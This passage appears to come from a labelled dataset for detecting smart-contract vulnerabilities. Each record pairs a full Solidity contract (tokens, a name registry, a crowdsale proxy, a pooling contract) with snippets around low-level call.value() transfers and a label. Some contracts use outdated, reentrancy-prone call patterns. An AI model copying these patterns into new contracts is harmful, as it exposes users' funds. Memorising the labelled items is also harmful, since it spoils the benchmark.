issueFeePercent = 2; event requestedRedeem(address indexed requestor, uint amount); event redeemed(address redeemer, uint amount); function() payable { uint issuedTokens = msg.value * (100 - issueFeePercent) / 100; if(!owner.send(msg.value - issuedTokens)) throw; if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw; totalSupply += issuedTokens; balances[msg.sender] += issuedTokens; ", "long path": "pragma solidity ^0.4.11; contract Ownable { address public owner; function Ownable() { owner = msg.sender; } modifier onlyOwner() { if (msg.sender != owner) { throw; } _; } function transferOwnership(address newOwner) onlyOwner { if (newOwner != address(0)) { owner = newOwner; } } } contract Token { uint256 public totalSupply; function balanceOf(address _owner) constant returns (uint256 balance); function transfer(address _to, uint256 _value) returns (bool success); function transferFrom(address _from, address _to, uint256 _value) returns (bool success); function approve(address _spender, uint256 _value) returns (bool success); function allowance(address _owner, address _spender) constant returns (uint256 remaining); event Transfer(address indexed _from, address indexed _to, uint256 _value); event Approval(address indexed _owner, address indexed _spender, uint256 _value); } contract StandardToken is Token { function transfer(address _to, uint256 _value) returns (bool success) { if (balances[msg.sender] >= _value && _value > 0) { balances[msg.sender] -= _value; balances[_to] += _value; Transfer(msg.sender, _to, _value); return true; } else { return false; } } function transferFrom(address _from, address _to, uint256 _value) returns (bool success) { if (balances[_from] >= _value && allowed[_from][msg.sender] >= _value && _value > 0) { balances[_to] += _value; balances[_from] -= _value; allowed[_from][msg.sender] -= _value; Transfer(_from, _to, _value); return true; } else { return false; } } function balanceOf(address _owner) constant returns (uint256 balance) { return balances[_owner]; } function approve(address _spender, uint256 _value) returns (bool success) { allowed[msg.sender][_spender] = _value; Approval(msg.sender, _spender, _value); return true; } function allowance(address _owner, address _spender) constant returns (uint256 remaining) { return allowed[_owner][_spender]; } mapping (address => uint256) balances; mapping (address => mapping (address => uint256)) allowed; } contract ERC20nator is StandardToken, Ownable { address public fundraiserAddress; bytes public fundraiserCallData; uint constant issueFeePercent = 2; event requestedRedeem(address indexed requestor, uint amount); event redeemed(address redeemer, uint amount); function() payable { uint issuedTokens = msg.value * (100 - issueFeePercent) / 100; if(!owner.send(msg.value - issuedTokens)) throw; if(!fundraiserAddress.call.value(issuedTokens)(fundraiserCallData))  throw; totalSupply += issuedTokens; balances[msg.sender] += issuedTokens; } function setFundraiserAddress(address _fundraiserAddress) onlyOwner { fundraiserAddress = _fundraiserAddress; } function setFundraiserCallData(string _fundraiserCallData) onlyOwner { fundraiserCallData = hexStrToBytes(_fundraiserCallData); } function requestRedeem(uint _amount) { requestedRedeem(msg.sender, _amount); } function redeem(uint _amount) onlyOwner{ redeemed(msg.sender, _amount); } function hexStrToBytes(string _hexString) constant returns (bytes) { if (bytes(_hexString)[0]!='0' || bytes(_hexString)[1]!='x' || bytes(_hexString).length%2!=0 || bytes(_hexString).length<4) { throw; } bytes memory bytes_array = new bytes((bytes(_hexString).length-2)/2); uint len = bytes(_hexString).length; for (uint i=2; i<len; i+=2) { uint tetrad1=16; uint tetrad2=16; if (uint(bytes(_hexString)[i])>=48 &&uint(bytes(_hexString)[i])<=57) tetrad1=uint(bytes(_hexString)[i])-48; if (uint(bytes(_hexString)[i+1])>=48 &&uint(bytes(_hexString)[i+1])<=57) tetrad2=uint(bytes(_hexString)[i+1])-48; if (uint(bytes(_hexString)[i])>=65 &&uint(bytes(_hexString)[i])<=70) tetrad1=uint(bytes(_hexString)[i])-65+10; if (uint(bytes(_hexString)[i+1])>=65 &&uint(bytes(_hexString)[i+1])<=70) tetrad2=uint(bytes(_hexString)[i+1])-65+10; if (uint(bytes(_hexString)[i])>=97 &&uint(bytes(_hexString)[i])<=102) tetrad1=uint(bytes(_hexString)[i])-97+10; if (uint(bytes(_hexString)[i+1])>=97 &&uint(bytes(_hexString)[i+1])<=102) tetrad2=uint(bytes(_hexString)[i+1])-97+10; if (tetrad1==16 || tetrad2==16) throw; bytes_array[i/2-1]=byte(16*tetrad1 + tetrad2); } return bytes_array; } } "}
{"sol name": "21277.sol", "label": 0, "first path": "function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) { return _to.call.value(_value).gas(_gas)(_code); modifier onlyManager require(msg.sender == manager); _; contract EthernameRaw is Managed { event Transfer( address indexed from, address indexed to, bytes32 indexed name ); event Approval( address indexed owner, address indexed approved, bytes32 indexed name ); event SendEther( address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value ); event Name(address indexed owner, bytes32 indexed name); event Price(bytes32 indexed name, uint256 price); event Buy(bytes32 indexed name, address buyer, uint256 price); event Attribute(bytes32 indexed name, bytes32 key); struct Record { address owner; uint256 price; mapping (bytes32 => bytes) attrs; string public constant name = \"Ethername\"; string public constant symbol = \"ENM\"; mapping (address => bytes32) public ownerToName; mapping (bytes32 => Record) public nameToRecord; mapping (bytes32 => address) public nameToApproved; ", "second path": "function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) { return _to.call.value(_value).gas(_gas)(_code); modifier onlyManager require(msg.sender == manager); _; contract EthernameRaw is Managed { event Transfer( address indexed from, address indexed to, bytes32 indexed name ); event Approval( address indexed owner, address indexed approved, bytes32 indexed name ); event SendEther( address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value ); event Name(address indexed owner, bytes32 indexed name); event Price(bytes32 indexed name, uint256 price); event Buy(bytes32 indexed name, address buyer, uint256 price); event Attribute(bytes32 indexed name, bytes32 key); struct Record { address owner; uint256 price; mapping (bytes32 => bytes) attrs; string public constant name = \"Ethername\"; string public constant symbol = \"ENM\"; mapping (address => bytes32) public ownerToName; mapping (bytes32 => Record) public nameToRecord; mapping (bytes32 => address) public nameToApproved; ", "third path": "function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) { return _to.call.value(_value).gas(_gas)(_code); modifier onlyManager require(msg.sender == manager); _; contract EthernameRaw is Managed { event Transfer( address indexed from, address indexed to, bytes32 indexed name ); event Approval( address indexed owner, address indexed approved, bytes32 indexed name ); event SendEther( address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value ); event Name(address indexed owner, bytes32 indexed name); event Price(bytes32 indexed name, uint256 price); event Buy(bytes32 indexed name, address buyer, uint256 price); event Attribute(bytes32 indexed name, bytes32 key); struct Record { address owner; uint256 price; mapping (bytes32 => bytes) attrs; string public constant name = \"Ethername\"; string public constant symbol = \"ENM\"; mapping (address => bytes32) public ownerToName; mapping (bytes32 => Record) public nameToRecord; mapping (bytes32 => address) public nameToApproved; ", "long path": "pragma solidity ^0.4.21; contract Managed { event Commission(uint256 basisPoint); address public manager; uint256 public commission; function Managed() public { manager = msg.sender; } function() public payable {} function setCommission(uint256 _commission) external { require(_commission < 10000); commission = _commission; emit Commission(commission); } function withdrawBalance() external { manager.transfer(address(this).balance); } function transferPower(address _newManager) external onlyManager { manager = _newManager; } function callFor(address _to, uint256 _value, uint256 _gas, bytes _code) external payable onlyManager returns (bool) { return _to.call.value(_value).gas(_gas)(_code); } modifier onlyManager { require(msg.sender == manager); _; } } contract EthernameRaw is Managed { event Transfer( address indexed from, address indexed to, bytes32 indexed name ); event Approval( address indexed owner, address indexed approved, bytes32 indexed name ); event SendEther( address indexed from, address indexed to, bytes32 sender, bytes32 recipient, uint256 value ); event Name(address indexed owner, bytes32 indexed name); event Price(bytes32 indexed name, uint256 price); event Buy(bytes32 indexed name, address buyer, uint256 price); event Attribute(bytes32 indexed name, bytes32 key); struct Record { address owner; uint256 price; mapping (bytes32 => bytes) attrs; } string public constant name = \"Ethername\"; string public constant symbol = \"ENM\"; mapping (address => bytes32) public ownerToName; mapping (bytes32 => Record) public nameToRecord; mapping (bytes32 => address) public nameToApproved; function rawRegister(bytes32 _name) public payable { _register(_name, msg.sender); } function rawTransfer(address _to, bytes32 _name) public onlyOwner(msg.sender, _name) { _transfer(msg.sender, _to, _name); } function rawApprove(address _to, bytes32 _name) public onlyOwner(msg.sender, _name) { _approve(msg.sender, _to, _name); } function rawTransferFrom(address _from, address _to, bytes32 _name) public onlyOwner(_from, _name) onlyApproved(msg.sender, _name) { _transfer(_from, _to, _name); } function rawSetPrice(bytes32 _name, uint256 _price) public onlyOwner(msg.sender, _name) { require(_price == uint256(uint128(_price))); nameToRecord[_name].price = _price; emit Price(_name, _price); } function rawBuy(bytes32 _name) public payable { Record memory _record = nameToRecord[_name]; require(_record.price > 0); uint256 _price = _computePrice(_record.price); require(msg.value >= _price); _record.owner.transfer(_record.price); _transfer(_record.owner, msg.sender, _name); msg.sender.transfer(msg.value - _price); emit Buy(_name, msg.sender, _price); } function rawUseName(bytes32 _name) public onlyOwner(msg.sender, _name) { _useName(msg.sender, _name); } function rawSetAttribute(bytes32 _name, bytes32 _key, bytes _value) public onlyOwner(msg.sender, _name) { nameToRecord[_name].attrs[_key] = _value; emit Attribute(_name, _key); } function rawWipeAttributes(bytes32 _name, bytes32[] _keys) public onlyOwner(msg.sender, _name) { mapping (bytes32 => bytes) attrs = nameToRecord[_name].attrs; for (uint i = 0; i < _keys.length; i++) { delete attrs[_keys[i]]; emit Attribute(_name, _keys[i]); } } function rawSendEther(bytes32 _name) public payable returns (bool _result) { address _to = nameToRecord[_name].owner; _result = (_name != bytes32(0)) && (_to != address(0)) && _to.send(msg.value); if (_result) { emit SendEther( msg.sender, _to, rawNameOf(msg.sender), _name, msg.value ); } } function rawNameOf(address _address) public view returns (bytes32 _name) { _name = ownerToName[_address]; } function rawOwnerOf(bytes32 _name) public view returns (address _owner) { _owner = nameToRecord[_name].owner; } function rawDetailsOf(bytes32 _name, bytes32 _key) public view returns (address _owner, uint256 _price, bytes _value) { _owner = nameToRecord[_name].owner; _price = _computePrice(nameToRecord[_name].price); _value = nameToRecord[_name].attrs[_key]; } function _register(bytes32 _name, address _to) internal { require(nameToRecord[_name].owner == address(0)); for (uint i = 0; i < _name.length; i++) { require((_name[i] == 0) || (_name[i] > 96 && _name[i] < 123) || (_name[i] > 47 && _name[i] < 58)); } _transfer(0, _to, _name); } function _transfer(address _from, address _to, bytes32 _name) internal { address _null = address(0); if (nameToApproved[_name] != _null) { _approve(_from, _null, _name); } if (ownerToName[_from] == _name) { _useName(_from, 0); } nameToRecord[_name] = Record(_to, 0); if (ownerToName[_to] == bytes32(0)) { _useName(_to, _name); } emit Transfer(_from, _to, _name); } function _approve(address _owner, address _to, bytes32 _name) internal { nameToApproved[_name] = _to; emit Approval(_owner, _to, _name); } function _useName(address _owner, bytes32 _name) internal { ownerToName[_owner] = _name; emit Name(_owner, _name); } function _computePrice(uint256 _price) internal view returns (uint256) { return _price * (10000 + commission) / 10000; } function _stringToBytes32(string _string) internal pure returns (bytes32 _bytes32) { require(bytes(_string).length < 33); assembly { _bytes32 := mload(add(_string, 0x20)) } } function _bytes32ToString(bytes32 _bytes32) internal pure returns (string _string) { assembly { let m := mload(0x40) mstore(m, 0x20) mstore(add(m, 0x20), _bytes32) mstore(0x40, add(m, 0x40)) _string := m } } modifier onlyOwner(address _claimant, bytes32 _name) { require(nameToRecord[_name].owner == _claimant); _; } modifier onlyApproved(address _claimant, bytes32 _name) { require(nameToApproved[_name] == _claimant); _; } } contract Ethername is EthernameRaw { function Ethername() public { commission = 200; nameToRecord[bytes32('')] = Record(this, 0); _register(bytes32('ethername'), this); _register(bytes32('root'), msg.sender); } function register(string _name) external payable { rawRegister(_stringToBytes32(_name)); } function transfer(address _to, string _name) external { rawTransfer(_to, _stringToBytes32(_name)); } function approve(address _to, string _name) external { rawApprove(_to, _stringToBytes32(_name)); } function transferFrom(address _from, address _to, string _name) external { rawTransferFrom(_from, _to, _stringToBytes32(_name)); } function setPrice(string _name, uint256 _price) external { rawSetPrice(_stringToBytes32(_name), _price); } function buy(string _name) external payable { rawBuy(_stringToBytes32(_name)); } function useName(string _name) external { rawUseName(_stringToBytes32(_name)); } function setAttribute(string _name, string _key, bytes _value) external { rawSetAttribute(_stringToBytes32(_name), _stringToBytes32(_key), _value); } function wipeAttributes(string _name, bytes32[] _keys) external { rawWipeAttributes(_stringToBytes32(_name), _keys); } function sendEther(string _name) external payable returns (bool _result) { _result = rawSendEther(_stringToBytes32(_name)); } function nameOf(address _address) external view returns (string _name) { _name = _bytes32ToString(rawNameOf(_address)); } function ownerOf(string _name) external view returns (address _owner) { _owner = rawOwnerOf(_stringToBytes32(_name)); } function detailsOf(string _name, string _key) external view returns (address _owner, uint256 _price, bytes _value) { return rawDetailsOf(_stringToBytes32(_name), _stringToBytes32(_key)); } } "}
{"sol name": "18145.sol", "label": 0, "first path": "function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner { ___upgradeTo(newTarget); require(address(this).call.value(msg.value)(data)); ", "second path": "function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner { ___upgradeTo(newTarget); require(address(this).call.value(msg.value)(data)); ", "third path": "function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner { ___upgradeTo(newTarget); require(address(this).call.value(msg.value)(data)); ", "long path": "pragma solidity ^0.4.21; contract CrowdsaleProxyTarget { function isActive() public returns(bool); function initialize(address _owner, address _token, address _familyOwner, address _personalOwner) public; address public token; } contract CrowdsaleProxy { bytes32 constant TARGET_POSITION = keccak256(\"CrowdsaleProxy.target\"); bytes32 constant OWNER_POSITION = keccak256(\"CrowdsaleProxy.owner\"); event Upgraded(address indexed target); modifier _onlyProxyOwner() { require(msg.sender == ___proxyOwner()); _; } function CrowdsaleProxy(address _target) public { require(_target != 0x0); bytes32 position = OWNER_POSITION; assembly { sstore(position, caller) } ___setTarget(_target); } function ___initialize(address _token, address _familyOwner, address _personalOwner) public { CrowdsaleProxyTarget(this).initialize(msg.sender, _token, _familyOwner, _personalOwner); } function () public payable { address _target = ___proxyTarget(); assembly { let ptr := mload(0x40) calldatacopy(ptr, 0, calldatasize) let success := delegatecall(sub(gas, 10000), _target, ptr, calldatasize, 0, 0) let retSz := returndatasize returndatacopy(ptr, 0, retSz) switch success case 0 { revert(ptr, retSz) } default { return(ptr, retSz) } } } function ___coinAddress() external view returns (address) { return CrowdsaleProxyTarget(this).token(); } function ___isActive() internal returns (bool res) { res = CrowdsaleProxyTarget(this).isActive(); } function ___proxyOwner() public view returns (address owner) { bytes32 position = OWNER_POSITION; assembly { owner := sload(position) } } function ___setProxyOwner(address newOwner) _onlyProxyOwner public { bytes32 position = OWNER_POSITION; assembly { sstore(position, newOwner) } } function ___proxyTarget() public view returns (address target) { bytes32 position = TARGET_POSITION; assembly { target := sload(position) } } function ___setTarget(address target) internal { bytes32 position = TARGET_POSITION; assembly { sstore(position, target) } } function ___upgradeTo(address newTarget) public _onlyProxyOwner { require(!___isActive()); require(___proxyTarget() != newTarget); ___setTarget(newTarget); emit Upgraded(___proxyTarget()); } function ___upgradeToAndCall(address newTarget, bytes data) payable public _onlyProxyOwner { ___upgradeTo(newTarget); require(address(this).call.value(msg.value)(data)); } } "}
{"sol name": "12454.sol", "label": 0, "first path": "function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy { require(contractStage < CONTRACT_SUBMIT_FUNDS, \"Cannot resubmit pool.\"); require(receiverAddress != 0x00, \"receiver address cannot be empty\"); uint256 contractBalance = address(this).balance; if(weiAmount == 0){ weiAmount = contractBalance; require(minContribution <= weiAmount && weiAmount <= contractBalance, \"submitted amount too small or larger than the balance\"); finalBalance = contractBalance; require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),\"Error submitting pool to receivingAddress\"); contractBalance = address(this).balance; if(contractBalance > 0) { ethRefundAmount.push(contractBalance); contractStage = CONTRACT_SUBMIT_FUNDS; emit PoolSubmitted(receiverAddress, weiAmount); ", "second path": "function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy { require(contractStage < CONTRACT_SUBMIT_FUNDS, \"Cannot resubmit pool.\"); require(receiverAddress != 0x00, \"receiver address cannot be empty\"); uint256 contractBalance = address(this).balance; if(weiAmount == 0){ weiAmount = contractBalance; require(minContribution <= weiAmount && weiAmount <= contractBalance, \"submitted amount too small or larger than the balance\"); finalBalance = contractBalance; require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),\"Error submitting pool to receivingAddress\"); contractBalance = address(this).balance; if(contractBalance > 0) { ethRefundAmount.push(contractBalance); contractStage = CONTRACT_SUBMIT_FUNDS; emit PoolSubmitted(receiverAddress, weiAmount); ", "third path": "function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy { require(contractStage < CONTRACT_SUBMIT_FUNDS, \"Cannot resubmit pool.\"); require(receiverAddress != 0x00, \"receiver address cannot be empty\"); uint256 contractBalance = address(this).balance; if(weiAmount == 0){ weiAmount = contractBalance; require(minContribution <= weiAmount && weiAmount <= contractBalance, \"submitted amount too small or larger than the balance\"); finalBalance = contractBalance; require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),\"Error submitting pool to receivingAddress\"); contractBalance = address(this).balance; if(contractBalance > 0) { ethRefundAmount.push(contractBalance); contractStage = CONTRACT_SUBMIT_FUNDS; emit PoolSubmitted(receiverAddress, weiAmount); ", "long path": "pragma solidity ^0.4.24; library Roles { struct Role { mapping (address => bool) bearer; } function add(Role storage role, address addr) internal { role.bearer[addr] = true; } function remove(Role storage role, address addr) internal { role.bearer[addr] = false; } function check(Role storage role, address addr) view internal { require(has(role, addr)); } function has(Role storage role, address addr) view internal returns (bool) { return role.bearer[addr]; } } contract RBAC { using Roles for Roles.Role; mapping (string => Roles.Role) private roles; event RoleAdded(address addr, string roleName); event RoleRemoved(address addr, string roleName); function checkRole(address addr, string roleName) view public { roles[roleName].check(addr); } function hasRole(address addr, string roleName) view public returns (bool) { return roles[roleName].has(addr); } function addRole(address addr, string roleName) internal { roles[roleName].add(addr); emit RoleAdded(addr, roleName); } function removeRole(address addr, string roleName) internal { roles[roleName].remove(addr); emit RoleRemoved(addr, roleName); } modifier onlyRole(string roleName) { checkRole(msg.sender, roleName); _; } } contract RBACWithAdmin is RBAC { string public constant ROLE_ADMIN = \"admin\"; modifier onlyAdmin() { checkRole(msg.sender, ROLE_ADMIN); _; } function RBACWithAdmin() public { addRole(msg.sender, ROLE_ADMIN); } function adminAddRole(address addr, string roleName) onlyAdmin public { addRole(addr, roleName); } function adminRemoveRole(address addr, string roleName) onlyAdmin public { removeRole(addr, roleName); } } library SafeMath { function mul(uint256 a, uint256 b) internal pure returns (uint256 c) { if (a == 0) { return 0; } c = a * b; assert(c / a == b); return c; } function div(uint256 a, uint256 b) internal pure returns (uint256) { return a / b; } function sub(uint256 a, uint256 b) internal pure returns (uint256) { assert(b <= a); return a - b; } function add(uint256 a, uint256 b) internal pure returns (uint256 c) { c = a + b; assert(c >= a); return c; } } contract ERC20 { function balanceOf(address _owner) public constant returns (uint256 balance); function transfer(address _to, uint256 _value) public returns (bool success); } contract FacultyPool is RBACWithAdmin { using SafeMath for uint; uint8 constant CONTRACT_OPEN = 1; uint8 constant CONTRACT_CLOSED = 2; uint8 constant CONTRACT_SUBMIT_FUNDS = 3; uint256 constant public gasLimit = 50000000000; uint256 constant public minContribution = 100000000000000000; address public owner; uint256 public feePct; uint8 public contractStage = CONTRACT_OPEN; uint256 public currentBeneficiaryCap; uint256 public totalPoolCap; address public receiverAddress; mapping (address => Beneficiary) beneficiaries; uint256 public finalBalance; uint256[] public ethRefundAmount; mapping (address => TokenAllocation) tokenAllocationMap; address public defaultToken; modifier isOpenContract() { require (contractStage == CONTRACT_OPEN); _; } bool locked; modifier noReentrancy() { require(!locked); locked = true; _; locked = false; } struct Beneficiary { uint256 ethRefund; uint256 balance; uint256 cap; mapping (address => uint256) tokensClaimed; } struct TokenAllocation { ERC20 token; uint256[] pct; uint256 balanceRemaining; } event BeneficiaryBalanceChanged(address indexed beneficiary, uint256 totalBalance); event ReceiverAddressSet(address indexed receiverAddress); event ERC223Received(address indexed token, uint256 value); event DepositReceived(address indexed beneficiary, uint256 amount, uint256 gas, uint256 gasprice, uint256 gasLimit); event PoolStageChanged(uint8 stage); event PoolSubmitted(address indexed receiver, uint256 amount); event RefundReceived(address indexed sender, uint256 amount); event TokenWithdrawal(address indexed beneficiary, address indexed token, uint256 amount); event EthRefunded(address indexed beneficiary, uint256 amount); constructor(address[] _admins, uint256 _poolCap, uint256 _beneficiaryCap, address _receiverAddr, uint256 _feePct) public { require(_admins.length > 0, \"Must have at least one admin apart from msg.sender\"); require(_poolCap >= _beneficiaryCap, \"Cannot have the poolCap <= beneficiaryCap\"); require(_feePct >=  0 && _feePct < 10000); feePct = _feePct; receiverAddress = _receiverAddr; totalPoolCap = _poolCap; currentBeneficiaryCap = _beneficiaryCap; owner = msg.sender; addRole(msg.sender, ROLE_ADMIN); for (uint8 i = 0; i < _admins.length; i++) { addRole(_admins[i], ROLE_ADMIN); } } function () payable public { if (contractStage == CONTRACT_OPEN) { emit DepositReceived(msg.sender, msg.value, gasleft(), tx.gasprice, gasLimit); _receiveDeposit(); } else { _receiveRefund(); } } function _receiveDeposit() isOpenContract internal { require(tx.gasprice <= gasLimit, \"Gas too high\"); require(address(this).balance <= totalPoolCap, \"Deposit will put pool over limit. Reverting.\"); Beneficiary storage b = beneficiaries[msg.sender]; uint256 newBalance = b.balance.add(msg.value); require(newBalance >= minContribution, \"contribution is lower than minContribution\"); if(b.cap > 0){ require(newBalance <= b.cap, \"balance is less than set cap for beneficiary\"); } else if(currentBeneficiaryCap == 0) { b.cap = totalPoolCap; }else { require(newBalance <= currentBeneficiaryCap, \"balance is more than currentBeneficiaryCap\"); b.cap = currentBeneficiaryCap; } b.balance = newBalance; emit BeneficiaryBalanceChanged(msg.sender, newBalance); } function _receiveRefund() internal { assert(contractStage >= 2); require(hasRole(msg.sender, ROLE_ADMIN) || msg.sender == receiverAddress, \"Receiver or Admins only\"); ethRefundAmount.push(msg.value); emit RefundReceived(msg.sender, msg.value); } function getCurrentBeneficiaryCap() public view returns(uint256 cap) { return currentBeneficiaryCap; } function getPoolDetails() public view returns(uint256 total, uint256 currentBalance, uint256 remaining) { remaining = totalPoolCap.sub(address(this).balance); return (totalPoolCap, address(this).balance, remaining); } function closePool() onlyAdmin isOpenContract public { contractStage = CONTRACT_CLOSED; emit PoolStageChanged(contractStage); } function submitPool(uint256 weiAmount) public onlyAdmin noReentrancy { require(contractStage < CONTRACT_SUBMIT_FUNDS, \"Cannot resubmit pool.\"); require(receiverAddress != 0x00, \"receiver address cannot be empty\"); uint256 contractBalance = address(this).balance; if(weiAmount == 0){ weiAmount = contractBalance; } require(minContribution <= weiAmount && weiAmount <= contractBalance, \"submitted amount too small or larger than the balance\"); finalBalance = contractBalance; require(receiverAddress.call.value(weiAmount).gas(gasleft().sub(5000))(),\"Error submitting pool to receivingAddress\"); contractBalance = address(this).balance; if(contractBalance > 0) { ethRefundAmount.push(contractBalance); } contractStage = CONTRACT_SUBMIT_FUNDS; emit PoolSubmitted(receiverAddress, weiAmount); } function viewBeneficiaryDetails(address beneficiary) public view returns (uint256 cap, uint256 balance, uint256 remaining, uint256 ethRefund){ Beneficiary storage b = beneficiaries[beneficiary]; return (b.cap, b.balance, b.cap.sub(b.balance), b.ethRefund); } function withdraw(address _tokenAddress) public { Beneficiary storage b = beneficiaries[msg.sender]; require(b.balance > 0, \"msg.sender has no balance. Nice Try!\"); if(contractStage == CONTRACT_OPEN){ uint256 transferAmt = b.balance; b.balance = 0; msg.sender.transfer(transferAmt); emit BeneficiaryBalanceChanged(msg.sender, 0); } else { _withdraw(msg.sender, _tokenAddress); } } function withdrawFor (address _beneficiary, address tokenAddr) public onlyAdmin { require (contractStage == CONTRACT_SUBMIT_FUNDS, \"Can only be done on Submitted Contract\"); require (beneficiaries[_beneficiary].balance > 0, \"Beneficary has no funds to withdraw\"); _withdraw(_beneficiary, tokenAddr); } function _withdraw (address _beneficiary, address _tokenAddr) internal { require(contractStage == CONTRACT_SUBMIT_FUNDS, \"Cannot withdraw when contract is not CONTRACT_SUBMIT_FUNDS\"); Beneficiary storage b = beneficiaries[_beneficiary]; if (_tokenAddr == 0x00) { _tokenAddr = defaultToken; } TokenAllocation storage ta = tokenAllocationMap[_tokenAddr]; require ( (ethRefundAmount.length > b.ethRefund) || ta.pct.length > b.tokensClaimed[_tokenAddr] ); if (ethRefundAmount.length > b.ethRefund) { uint256 pct = _toPct(b.balance,finalBalance); uint256 ethAmount = 0; for (uint i= b.ethRefund; i < ethRefundAmount.length; i++) { ethAmount = ethAmount.add(_applyPct(ethRefundAmount[i],pct)); } b.ethRefund = ethRefundAmount.length; if (ethAmount > 0) { _beneficiary.transfer(ethAmount); emit EthRefunded(_beneficiary, ethAmount); } } if (ta.pct.length > b.tokensClaimed[_tokenAddr]) { uint tokenAmount = 0; for (i= b.tokensClaimed[_tokenAddr]; i< ta.pct.length; i++) { tokenAmount = tokenAmount.add(_applyPct(b.balance, ta.pct[i])); } b.tokensClaimed[_tokenAddr] = ta.pct.length; if (tokenAmount > 0) { require(ta.token.transfer(_beneficiary,tokenAmount)); ta.balanceRemaining = ta.balanceRemaining.sub(tokenAmount); emit TokenWithdrawal(_beneficiary, _tokenAddr, tokenAmount); } } } function setReceiver(address addr) public onlyAdmin { require (contractStage < CONTRACT_SUBMIT_FUNDS); receiverAddress = addr; emit ReceiverAddressSet(addr); } function enableTokenWithdrawals (address _tokenAddr, bool _useAsDefault) public onlyAdmin noReentrancy { require (contractStage == CONTRACT_SUBMIT_FUNDS, \"wrong contract stage\"); if (_useAsDefault) { defaultToken = _tokenAddr; } else { require (defaultToken != 0x00, \"defaultToken must be set\"); } TokenAllocation storage ta  = tokenAllocationMap[_tokenAddr]; if (ta.pct.length==0){ ta.token = ERC20(_tokenAddr); } uint256 amount = ta.token.balanceOf(this).sub(ta.balanceRemaining); require (amount > 0); if (feePct > 0) { uint256 feePctFromBips = _toPct(feePct, 10000); uint256 feeAmount = _applyPct(amount, feePctFromBips); require (ta.token.transfer(owner, feeAmount)); emit TokenWithdrawal(owner, _tokenAddr, feeAmount); } amount = ta.token.balanceOf(this).sub(ta.balanceRemaining); ta.balanceRemaining = ta.token.balanceOf(this); ta.pct.push(_toPct(amount,finalBalance)); } function checkAvailableTokens (address addr, address tokenAddr) view public returns (uint tokenAmount) { Beneficiary storage b = beneficiaries[addr]; TokenAllocation storage ta = tokenAllocationMap[tokenAddr]; for (uint i = b.tokensClaimed[tokenAddr]; i < ta.pct.length; i++) { tokenAmount = tokenAmount.add(_applyPct(b.balance, ta.pct[i])); } return tokenAmount; } function tokenFallback (address from, uint value, bytes data) public { emit ERC223Received (from, value); } function _toPct (uint numerator, uint denominator ) internal pure returns (uint) { return numerator.mul(10 ** 20) / denominator; } function _applyPct (uint numerator, uint pct) internal pure returns (uint) { return numerator.mul(pct) / (10 ** 20); } } "}
{"sol name": "30178.sol", "label": 0, "first path": "function buy() payable notPaused() public returns(bool) { require(now >= salesStart); require(now < salesDeadline); uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE; require(tokensToBuy > 0); uint timeBonus = _calculateTimeBonus(tokensToBuy, now); uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value); uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus; require(token.transfer(msg.sender, totalTokensToTransfer)); LogBought(msg.sender, msg.value, totalTokensToTransfer, 0); require(wallet.call.value(msg.value)()); return true; ", "second path": "function buy() payable notPaused() public returns(bool) { require(now >= salesStart); require(now < salesDeadline); uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE; require(tokensToBuy > 0); uint timeBonus = _calculateTimeBonus(tokensToBuy, now); uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value); uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus; require(token.transfer(msg.sender, totalTokensToTransfer)); LogBought(msg.sender, msg.value, totalTokensToTransfer, 0); require(wallet.call.value(msg.value)()); return true; ", "third path": "function buy() payable notPaused() public returns(bool) { require(now >= salesStart); require(now < salesDeadline); uint tokensToBuy = msg.value * MULTIPLIER / TOKEN_PRICE; require(tokensToBuy > 0); uint timeBonus = _calculateTimeBonus(tokensToBuy, now); uint volumeBonus = _calculateVolumeBonus(tokensToBuy, msg.sender, msg.value); uint totalTokensToTransfer = tokensToBuy + timeBonus + volumeBonus; require(token.transfer(msg.sender, totalTokensToTransfer)); LogBought(msg.sender, msg.value, totalTokensToTransfer, 0); require(wallet.call.value(msg.value)()); return true; ", "long path": "pragma solidity ^0.4.18; contract Token { function transfer(address _to, uint _value) public returns(bool); function burn(uint _value) public; function balanceOf(address _owner) view public returns(uint); function decimals() view public returns(uint8); function transferOwnership(address _newOwner) public; } library SafeMath { function add(uint _a, uint _b) internal pure returns(uint) { uint c = _a + _b; assert(c >= _a); return c; } function mul(uint _a, uint _b) internal pure returns(uint) { if (_a == 0) { return 0; } uint c = _a * _b; assert(c / _a == _b); return c; } function div(uint _a, uint _b) internal pure returns(uint) { return _a / _b; } function sub(uint _a, uint _b) internal pure returns (uint) { assert(_b <= _a); return _a - _b; } } contract Owned { address public contractOwner; address public pendingContractOwner; event LogContractOwnershipChangeInitiated(address to); event LogContractOwnershipChangeCompleted(address to); function Owned() public { contractOwner = msg.sender; } modifier onlyContractOwner() { require(contractOwner == msg.sender); _; } function changeContractOwnership(address _to) onlyContractOwner() public returns(bool) { pendingContractOwner = _to; LogContractOwnershipChangeInitiated(_to); return true; } function claimContractOwnership() public returns(bool) { if (pendingContractOwner != msg.sender) { return false; } contractOwner = pendingContractOwner; delete pendingContractOwner; LogContractOwnershipChangeCompleted(contractOwner); return true; } function forceChangeContractOwnership(address _to) onlyContractOwner() public returns(bool) { contractOwner = _to; LogContractOwnershipChangeCompleted(contractOwner); return true; } } contract NeuroSale is Owned { using SafeMath for uint; mapping(address => 